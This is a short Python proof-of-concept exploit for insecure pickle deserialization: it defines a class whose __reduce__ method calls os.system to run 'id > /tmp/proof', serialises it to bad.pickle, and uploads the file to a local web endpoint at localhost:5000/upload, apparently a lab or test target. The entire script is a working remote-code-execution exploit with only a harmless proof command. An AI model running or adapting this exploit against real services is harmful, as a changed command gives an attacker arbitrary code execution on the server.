import pickle
import os
import requests

class Pickle(object):
    def __reduce__(self):
        return os.system, ('id > /tmp/proof',)

o = Pickle()
p = pickle.dump(o, open('bad.pickle', 'wb'))


url = 'http://localhost:5000/upload'
files = {'file': open("bad.pickle", "rb").read()}
response = requests.post(url, files=files)
print(response.text)